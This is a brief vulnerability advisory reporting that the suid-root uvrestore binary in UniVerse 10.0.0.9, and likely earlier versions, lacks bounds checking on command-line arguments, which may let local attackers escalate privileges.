It has been reported that the uvrestore binary does not perform bounds checking when parsing command-line arguments. Because this binary is installed with suid root privileges by default, local attackers my be able to exploit this vulnerability to elevate privileges.

While this vulnerability was reported in UniVerse version 10.0.0.9, previous versions are likely vulnerable as well.
